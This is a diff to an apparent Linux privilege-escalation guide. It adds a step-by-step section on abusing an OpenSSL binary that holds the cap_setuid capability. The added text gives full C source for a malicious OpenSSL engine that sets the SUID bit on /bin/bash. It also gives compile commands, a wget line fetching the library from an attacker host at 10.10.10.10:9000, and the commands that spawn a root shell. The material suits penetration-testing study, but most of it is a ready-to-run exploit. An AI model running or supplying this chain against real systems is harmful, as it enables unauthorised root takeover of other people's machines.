@@ -16,7 +16,7 @@ Simple and accurate guide for linux privilege escalation tactics
 - SUID / GUID Binaries
 - SUID PATH Environmental Variable
 - Cron Tabs & Scheduled Tasks
-- Capabilities
+- Capabilities (Python - Perl - Tar - OpenSSL)
 - NFS Root Squashing
 - chkrootkit 0.49
 - Tmux
@@ -752,6 +752,7 @@ Capabilities can be set on processes and executable files. A process resulting f
 - Python
 - Perl
 - Tar
+- OpenSSL
 
 Python
 
@@ -798,6 +799,77 @@ Crack root's credentials
 Victim
 
 su root
+id && whoami
+```
+
+OpenSSL
+
+Victim
+```
+getcap -r / 2>/dev/null         
+/usr/bin/openssl = cap_setuid+ep
+```
+
+Attacker
+Create a .so file - Code below
+vi priv.c
+```
+#include <openssl/engine.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+static const char *engine_id = "test";
+static const char *engine_name = "hope it works";
+
+static int bind(ENGINE *e, const char *id)
+{
+  int ret = 0;
+
+  if (!ENGINE_set_id(e, engine_id)) {
+    fprintf(stderr, "ENGINE_set_id failed\n");
+    goto end;
+  }
+  if (!ENGINE_set_name(e, engine_name)) {
+    printf("ENGINE_set_name failed\n");
+    goto end;
+  }
+  setuid(0);
+  setgid(0);
+  system("chmod +s /bin/bash");    
+  system("echo Complete!");
+  ret = 1;
+ end:
+  return ret;
+}
+
+IMPLEMENT_DYNAMIC_BIND_FN(bind)
+IMPLEMENT_DYNAMIC_CHECK_FN()
+
+```
+
+Compile Code & Create .so file
+
+```
+gcc -c fPIC priv.c -o priv
+gcc -shared -o priv.so -lcrypto priv
+```
+
+Victim
+
+Download .so from Attacker
+
+```
+wget -O /tmp/priv.so http://10.10.10.10:9000/priv.so
+
+// Replace IP & Port
+```
+Get Root
+
+```
+openssl req -engine /tmp/priv.so
+/bin/bash -p
 id && whoami
 ```
 
